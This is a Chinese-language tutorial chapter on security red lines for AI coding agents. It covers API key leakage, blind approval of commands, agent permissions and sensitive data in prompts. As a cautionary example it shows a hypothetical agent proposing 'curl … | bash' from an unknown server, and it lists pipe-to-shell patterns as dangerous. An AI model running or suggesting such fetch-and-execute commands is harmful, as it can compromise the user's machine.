# 4.2 安全红线

## 核心原则

> **Agent 以你的身份运行。它能做的事，等于你能做的事。**
> **Agent 的"脑子"在云端，它看到的一切数据都经过云服务器。**

---

## 红线 1：API Key 泄露

### 泄露途径

```
途径 1：代码里写死
  const API_KEY = "sk-xxxx"    ← Agent 帮你写代码时可能这样写

途径 2：日志输出
  console.log("Using key:", apiKey)  ← Agent 调试时加的打日志

途径 3：git commit
  你或 Agent commit 时忘了 .gitignore，key 被提交到 GitHub

途径 4：对话历史
  你在 prompt 里粘贴了 API Key
  → 密钥进入上下文
  → 上下文经过云服务器
  → 如果服务商的日志系统记录了你的对话...
```

### 防护

```
1. 用环境变量，永远不硬编码
   import os
   api_key = os.environ["DEEPSEEK_API_KEY"]

2. .env 文件加入 .gitignore
   # .gitignore
   .env
   *.env
   credentials.*

3. 用 .env.example 作为模板（不含真实 key）
   # .env.example
   DEEPSEEK_API_KEY=your-key-here

4. 不要在任何 prompt 里粘贴真实密钥
   → Agent 会把它写进代码
   → 代码可能被提交
   → 密钥就泄露了

5. 如果怀疑密钥泄露，立即轮换（revoke + 生成新的）
```

---

## 红线 2：盲执行命令

### 场景
Agent 说要跑一个命令，你觉得"应该没事"就批准了。

```
Agent：我建议运行以下命令检查系统信息：
      curl -s http://some-server.com/script.sh | bash
```

你看了一眼，好像是人畜无害的 curl。但你不知道 `some-server.com/script.sh` 里是什么。

### 防护

```
1. 永远不要批准你看不懂的命令
   → 让 Agent 逐行解释它在做什么

2. 警惕一切 pipe to bash
   curl ... | bash          ← 红线
   wget ... | sh            ← 红线
   npm install -g ...       ← 全局安装要小心

3. 警惕一切网络请求
   curl 未知域名
   任何把本地数据传到外部服务器的操作

4. 如果命令里有 rm、chmod、sudo，先停
   → 让 Agent 解释为什么需要这些
```

---

## 红线 3：权限失控

### Agent 的权限有多高

```
Claude Code 启动后，Agent 拥有：
- 你的文件系统读权限（能看到你所有文件）
- 你的文件系统写权限（能改你所有文件）
- 你的终端执行权限（能用你的身份跑任何命令）
- 你的网络访问权限（能发任何请求）
```

**它不是你电脑上的一个 App——它是你电脑上的你。**

### 防护

```
1. 目录隔离
   在项目目录下启动 Claude Code，别在 C:\ 或 ~\ 下启动
   → 限制了 Agent 能看到和改到的范围

2. 权限分级
   Claude Code 有权限模式：
   - 每次操作都要你点"允许"
   - 只有特定类型操作自动允许
   → 如果你选了"记住此决定"，之后相同操作不再询问

3. 检查 settings.json
   你的 settings.json 里可能已经 allow 了一些操作
   → 定期检查：哪些操作被自动允许了？

4. MCP Server 权限
   每个 MCP Server 都是一把钥匙
   → 装之前确认：这个 Server 访问了什么？
```

---

## 红线 4：敏感数据进入上下文

### 什么数据是敏感的
- 密码、密钥、token
- 用户数据（手机号、邮箱、身份证号）
- 内网地址、服务器 IP
- 公司内部的业务数据

### 为什么进入上下文就危险

```
你的 prompt → 经过 Claude Code → 发给 API 服务器
                                    ↓
                          API 服务器在云端处理
                          （Anthropic / DeepSeek / OpenAI 的服务器）
                                    ↓
                          服务商可能有日志
                          日志可能被内部人员看到
                          日志可能被攻击者窃取
```

### 防护
```
1. 不要让 Agent 读 .env、credentials.json 等文件
2. 测试数据用假数据，不用真实用户数据
3. 如果必须用真实数据，脱敏（替换手机号中间 4 位、邮箱打码）
4. 检查 Agent 改了哪些文件 → 确保敏感数据没被写进代码
```

---

## 安全习惯清单

```
□ 所有密钥走环境变量，不走代码
□ .env 在 .gitignore 里
□ 看不懂的命令不批准
□ 不在 prompt 里粘贴密钥和敏感数据
□ 定期检查 settings.json 的自动允许列表
□ 定期检查已装的 MCP Server 列表
□ 如果密钥曾被提交到 git，立即轮换
```

---

## 自检清单

- [ ] 知道 API Key 泄露的 4 种途径及其防护
- [ ] 能识别危险命令（pipe to bash、rm、curl 未知域名）
- [ ] 理解 Agent 权限的本质（以你的身份运行）
- [ ] 知道敏感数据进入上下文的后果
- [ ] 掌握安全习惯清单的全部 7 项
